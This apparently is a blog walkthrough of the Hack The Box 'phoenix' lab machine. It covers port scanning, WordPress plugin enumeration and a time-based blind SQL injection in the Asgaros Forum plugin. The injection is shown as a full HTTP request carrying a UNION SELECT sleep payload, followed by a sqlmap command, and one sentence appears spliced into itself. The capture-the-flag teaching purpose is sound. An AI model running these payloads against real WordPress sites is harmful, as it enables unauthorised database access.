<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	05 Mar 2022IP:	10.10.11.149">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[phoenix]">
<meta property="og:url" content="https://fdlucifer.github.io/2022/03/24/phoenix/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	05 Mar 2022IP:	10.10.11.149">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2183.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2184.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2185.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2186.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2187.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2188.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2189.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2190.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2191.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2192.jpg">
<meta property="article:published_time" content="2022-03-24T05:30:09.000Z">
<meta property="article:modified_time" content="2022-06-25T15:43:01.498Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2183.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2022/03/24/phoenix/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/03/24/phoenix/","path":"2022/03/24/phoenix/","title":"Hack-The-Box-walkthrough[phoenix]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[phoenix] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">46</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">209</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Foothold"><span class="nav-number">3.</span> <span class="nav-text">Foothold</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GET-OPT-KEY"><span class="nav-number">4.</span> <span class="nav-text">GET OPT KEY</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#User-own"><span class="nav-number">5.</span> <span class="nav-text">User own</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Root-own"><span class="nav-number">6.</span> <span class="nav-text">Root own</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">7.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">8.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">209</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/03/24/phoenix/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[phoenix] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[phoenix]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-24 13:30:09" itemprop="dateCreated datePublished" datetime="2022-03-24T13:30:09+08:00">2022-03-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-06-25 23:43:01" itemprop="dateModified" datetime="2022-06-25T23:43:01+08:00">2022-06-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.1k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>22 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	05 Mar 2022<br>IP:	10.10.11.149</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2183.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.149</span></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     Apache httpd</span><br><span class="line">443/tcp open  ssl/http Apache httpd</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>We have a couple http ports, let’s start with them:</p>
<p>We’re given the domain phoenix.htb so we add it to &#x2F;etc&#x2F;hosts. We can register and login to an account:</p>
<p>After singing in, we’re taken to a wordpress panel:</p>
<p>We see pie register however no luck with exploiting it. We can bruteforce directories and find there’s a WAF too:</p>
<p>We also have a site administrator that we find over at &#x2F;forum:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2184.jpg"></li>
</ul>
<p>Looking further into this &#x2F;forum directory, we find it’s ran by Asgaros Forum, the current install is vulnerable to SQLi:d find cron.sh.xLooking further into this &#x2F;forum directory, we find it’s ran by Asgaros Forum, the current install is vulnerable to SQLi:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https://phoenix.htb/ --disable-tls-checks –enumerate u</span><br><span class="line"></span><br><span class="line">Disallow: /wp-admin/</span><br><span class="line">Allow: /wp-admin/admin-ajax.php</span><br><span class="line"></span><br><span class="line">Sitemap: https://phoenix.htb/wp-sitemap.xml</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: https://phoenix.htb/robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - /wp-admin/</span><br><span class="line"> |  - /wp-admin/admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://phoenix.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;</span><br><span class="line"> |  - https://phoenix.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: coming-soon-event</span><br><span class="line"> | Location: https://phoenix.htb/wp-content/themes/coming-soon-event/</span><br><span class="line"> | Latest Version: 1.0.8 (up to <span class="built_in">date</span>)</span><br><span class="line"> | Last Updated: 2021-08-24T00:00:00.000Z</span><br><span class="line"> | Readme: https://phoenix.htb/wp-content/themes/coming-soon-event/readme.txt</span><br><span class="line"> | Style URL: https://phoenix.htb/wp-content/themes/coming-soon-event/style.css?ver=1.0.0</span><br><span class="line"> | Style Name: Coming Soon Event</span><br><span class="line"> | Description: The Coming Soon Event under construction theme will play a big role <span class="keyword">in</span> boosting up the business and ...</span><br><span class="line"> | Author: blogwp</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0.8 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://phoenix.htb/wp-content/themes/coming-soon-event/style.css?ver=1.0.0, Match: <span class="string">&#x27;Version: 1.0.8&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] accordion-slider-gallery</span><br><span class="line"> | Location: https://phoenix.htb/wp-content/plugins/accordion-slider-gallery/</span><br><span class="line"> | Latest Version: 2.2</span><br><span class="line"> | Last Updated: 2022-02-23T06:48:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Urls In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] asgaros-forum</span><br><span class="line"> | Location: https://phoenix.htb/wp-content/plugins/asgaros-forum/</span><br><span class="line"> | Last Updated: 2022-01-30T12:54:00.000Z</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 2.0.0</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Urls In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.15.12 (10% confidence)</span><br><span class="line"> | Found By: Query Parameter (Passive Detection)</span><br><span class="line"> |  - https://phoenix.htb/wp-content/plugins/asgaros-forum/skin/widgets.css?ver=1.15.12</span><br><span class="line"></span><br><span class="line">[+] photo-gallery-builder</span><br><span class="line"> | Location: https://phoenix.htb/wp-content/plugins/photo-gallery-builder/</span><br><span class="line"> | Latest Version: 2.3</span><br><span class="line"> | Last Updated: 2022-02-23T07:02:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Urls In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] pie-register</span><br><span class="line"> | Location: https://phoenix.htb/wp-content/plugins/pie-register/</span><br><span class="line"> | Latest Version: 3.7.4.2</span><br><span class="line"> | Last Updated: 2022-02-14T05:16:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Urls In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] timeline-event-history</span><br><span class="line"> | Location: https://phoenix.htb/wp-content/plugins/timeline-event-history/</span><br><span class="line"> | Latest Version: 2.2</span><br><span class="line"> | Last Updated: 2022-02-23T06:58:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Urls In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93cHNjYW4uY29tL3Z1bG5lcmFiaWxpdHkvMzUyNzIxOTctYzk3My00OGFkLTg0MDUtNTM4YmZiYWZhMTcy">Asgaros Forum &lt; 2.0.0 - Subscriber+ Blind SQL Injection<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>we first need to get the _wpnonce value:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://phoenix.htb/wp-admin/admin-ajax.php?action=rest-nonce</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2185.jpg"></li>
</ul>
<p>so we can build the payload request like below:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?rest_route=/asgaros-forum/v1/reaction/1/hello HTTP/2</span><br><span class="line">Host: phoenix.htb</span><br><span class="line">Cookie: asgarosforum_unread_cleared=1000-01-01%2000%3A00%3A00; asgarosforum_unread_exclude=a%3A1%3A%7Bi%3A1%3Bi%3A1%3B%7D; wp-settings-time-8=1648102004; PHPSESSID=9fjjtktvasvk7ttiae2lag57bj; wordpress_logged_in_3185d858877bd1933266ec420c541bfc=luci%7C1649311604%7CDS4X13KhVrhypqTbdEQOOGSwBAYP3Sra5ZwFwAC7FCE%7C7e49b65fe7fd8b77bbeb4209856d4ac458907af59e10ff0015ab926f72d210bd; wp-settings-8=mfold%3Df</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://phoenix.htb/forum/forum/first-forum/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post_id=1 UNION SELECT 1, 1, 1, 1, 1,2,3,4,5,<span class="built_in">sleep</span>(2) FROM dual -- g&amp;_wpnonce=3354d7889a</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2186.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2187.jpg"></p>
</li>
</ul>
<p>confirmed this is a time based sql injection</p>
<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>We confirm this works via manual injection. I’ll use SQLMAP to further this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url https://phoenix.htb/forum/?subscribe_topic=1 --level 3 --risk 3 --batch</span><br></pre></td></tr></table></figure>

